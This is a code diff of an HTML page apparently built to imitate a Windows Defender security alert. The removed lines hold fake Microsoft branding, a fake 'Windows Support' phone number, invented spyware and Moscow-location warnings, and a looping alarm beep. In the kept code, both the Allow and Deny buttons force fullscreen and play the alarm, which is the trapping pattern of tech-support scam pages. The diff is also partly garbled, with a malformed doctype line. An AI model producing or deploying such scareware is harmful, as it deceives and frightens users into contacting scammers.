@@ -1,9 +1,8 @@
-<!DOCTYPE html>
+<<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <title>Security Alert Simulation</title>
-
 <style>
   body {
     margin:0;
@@ -86,15 +85,20 @@
     font-size:14px;
   }
 
-  .buttons {
+  /* Single buttons box */
+  .buttons-box {
     margin-top:15px;
+    background:#f0f0f0;
+    padding:10px;
+    border-radius:6px;
     display:flex;
-    justify-content:flex-end;
+    justify-content:center;
     gap:10px;
   }
 
-  button {
-    padding:8px 15px;
+  .buttons-box button {
+    padding:8px 20px;
+    font-weight:bold;
     border:none;
     border-radius:4px;
     cursor:pointer;
@@ -110,7 +114,6 @@
     text-align:center;
   }
 </style>
-
 </head>
 <body>
 
@@ -149,7 +152,8 @@
     </div>
   </div>
 
-  <div class="buttons">
+  <!-- Single buttons box -->
+  <div class="buttons-box">
     <button class="allow" onclick="triggerFullscreen()">Allow</button>
     <button class="deny" onclick="triggerFullscreen()">Deny</button>
   </div>
@@ -166,7 +170,7 @@
 </audio>
 
 <script>
-  // Generate random error code
+  // Random error code
   function genCode(){
     return "0x" + Math.floor(Math.random()*999999).toString(16);
   }
@@ -174,8 +178,9 @@
 
   const sound = document.getElementById("alertSound");
 
+  // Click to trigger full screen + sound
   function triggerFullscreen() {
-    // Start sound safely
+    // Play sound
     sound.play().catch(()=>{});
 
     // Fullscreen request
@@ -188,68 +193,10 @@
       elem.msRequestFullscreen();
     }
 
-    // Optional: add any extra animations here (progress bar already animates)
-    alert("Simulation active in fullscreen"); // optional demo message
+    // Optional demo alert
+    // alert("Simulation active in fullscreen");
   }
 </script>
-
-</body>
-</html>
-  .allow {
-    background:#0078D7;
-    color:white;
-  }
-
-  .deny {
-    background:#d32f2f;
-    color:white;
-  }
-</style>
-</head>
-<body>
-
-<div class="container">
-  <!-- Header with logo -->
-  <div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
-    <h1>Windows Defender Security Center</h1>
-  </div>
-
-  <!-- Main Warning Box -->
-  <div class="warning-box">
-    <h2>System Warning ⚠</h2>
-    <p>Access to this PC has been blocked for security reasons.</p>
-    <p>Contact Windows Support: <strong>+1 (800) 1234-2234</strong> (toll free)</p>
-    <div class="buttons">
-      <button class="allow" onclick="return false;">Allow</button>
-      <button class="deny" onclick="return false;">Deny</button>
-    </div>
-  </div>
-
-  <!-- Info Boxes -->
-  <div class="info-grid">
-    <div class="info-box white">
-      <strong>Spyware Detected:</strong><br>
-      Trojan.Generic.KA<br>
-      Last Scan: Today 10:15 AM
-    </div>
-    <div class="info-box">
-      <strong>Location:</strong><br>
-      Moscow, Russia<br>
-      Time Zone: UTC+3
-    </div>
-    <div class="info-box">
-      <strong>Status:</strong><br>
-      System Vulnerable<br>
-      Action Recommended
-    </div>
-  </div>
-</div>
-
-<!-- Beep sound -->
-<audio autoplay loop>
-  <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
-</audio>
 
 </body>
 </html>
